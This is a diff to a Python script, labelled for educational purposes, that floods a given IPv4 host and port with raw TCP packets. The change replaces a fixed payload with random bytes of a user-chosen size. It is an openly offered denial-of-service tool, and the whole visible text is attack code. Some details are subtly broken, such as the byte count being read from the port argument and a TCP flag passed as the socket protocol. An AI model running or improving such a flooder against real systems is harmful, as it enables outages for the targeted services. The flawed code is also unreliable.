@@ -3,7 +3,11 @@ import sys
 from concurrent.futures import Future
 from concurrent.futures import ThreadPoolExecutor
 from concurrent.futures import as_completed
-
+try:
+    from random import randbytes
+except:
+    print("It is required to use python 3.9+ version in order to run this script")
+    sys.exit(-1)
 # Educational Purposes Only
 # Z3NTL3
 # TCP Raw Layer 4 Flood for Ipv4's
@@ -11,12 +15,13 @@ from concurrent.futures import as_completed
 count = 0
 def Usage():
     print(f"""
-python3 {__file__} ip port
+python3 {__file__} ip port bytes
 """)
 
 try:
     websiteHost_or_IP = sys.argv[1]
     portX = int(sys.argv[2])
+    bytesX = int(sys.argv[2])
     
 except:
     Usage()
@@ -46,17 +51,16 @@ def FormatCheck():
 '''
 def Flooder(**pHu):
     global count
+    sVar = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.TCP_NODELAY)
     try:
-        sVar = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
-        sVar.setsockopt(socket.TCP_NODELAY)
-        z3Payload = b("\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\xd9\x68\xa3\x00\x00\x00\x00\x01\x03\x03\x07\xfe\x04\xf9\x89", 24)
+        z3Payload = randbytes(bytesX)
         sendByte = sVar.sendto(z3Payload, (pHu['host_ip'],pHu['port']))
         count+=1
         return f"SEND {count} TCP Flood with {sendByte} BYTES {pHu['host_ip']}:{pHu['port']}"
     except:
         return f"TCP Flood Failed On {pHu['host_ip']}:{pHu['port']}"
     finally:
-        sVar.close()
+       sVar.close()
     
 def Main():
     global count
